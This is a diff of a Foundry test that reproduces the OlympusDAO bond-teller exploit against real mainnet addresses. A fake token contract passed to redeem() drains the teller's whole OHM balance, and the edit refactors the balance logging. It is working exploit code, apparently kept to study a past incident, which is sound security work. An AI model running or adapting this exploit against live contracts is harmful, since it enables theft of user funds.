@@ -5,6 +5,8 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../TestHarness.sol";
 import {IERC20} from "../interfaces/IERC20.sol";
 
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
+
 // forge test --match-contract Exploit_OlympusDao -vvv
 
 /*
@@ -56,20 +58,8 @@ interface IBondFixedExpiryTeller {
     function redeem(ExploitOlympusToken token_, uint256 amount_) external;
 }
 
-contract ExploitOlympusToken {
-    function underlying() external view returns(address) {
-        return OHM;
-    }
-
-    function expiry() external pure returns (uint48 _expiry) {
-        return 1;
-    }
-
-    function burn(address,uint256) external {} // it could do nothing as long as the burn(address,uint256) selector exists.
-}
-
 // forge test --match-contract Exploit_OlympusDao -vvv
-contract Exploit_OlympusDao is TestHarness {
+contract Exploit_OlympusDao is TestHarness, TokenBalanceTracker {
 
     address constant internal BOND_FIXED_EXPIRY_TELLER = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
     address constant internal ATTACKER = 0x443cf223e209E5A2c08114A2501D8F0f9Ec7d9Be;
@@ -85,6 +75,10 @@ contract Exploit_OlympusDao is TestHarness {
 
         exploitToken = new ExploitOlympusToken();
         bondExpiryTeller = IBondFixedExpiryTeller(BOND_FIXED_EXPIRY_TELLER);
+
+        addTokenToTracker(OHM);
+        updateBalanceTracker(ATTACKER);
+        updateBalanceTracker(BOND_FIXED_EXPIRY_TELLER);
     }
 
     function test_Attack() public {
@@ -92,17 +86,29 @@ contract Exploit_OlympusDao is TestHarness {
         uint256 initialTellerContractBalance = IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER);
         
         console.log("\nBefore Attack OHM Balance");
-        console.log("Teller: ",IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER));
-        console.log("Attacker: ",IERC20(OHM).balanceOf(ATTACKER));
+        logBalancesWithLabel('Teller', BOND_FIXED_EXPIRY_TELLER);
+        logBalancesWithLabel('Attacker', ATTACKER);
         
         // We pass the exploit token that has the required properties mentioned before
         bondExpiryTeller.redeem(exploitToken, initialTellerContractBalance); 
         
         console.log("\nAfter Attack OHM Balance");
-        console.log("Teller: ",IERC20(OHM).balanceOf(BOND_FIXED_EXPIRY_TELLER));
-        console.log("Attacker: ",IERC20(OHM).balanceOf(ATTACKER));
+        logBalancesWithLabel('Teller', BOND_FIXED_EXPIRY_TELLER);
+        logBalancesWithLabel('Attacker', ATTACKER);
 
         vm.stopPrank();
     }
 
+}
+
+contract ExploitOlympusToken {
+    function underlying() external view returns(address) {
+        return OHM;
+    }
+
+    function expiry() external pure returns (uint48 _expiry) {
+        return 1;
+    }
+
+    function burn(address,uint256) external {} // it could do nothing as long as the burn(address,uint256) selector exists.
 }
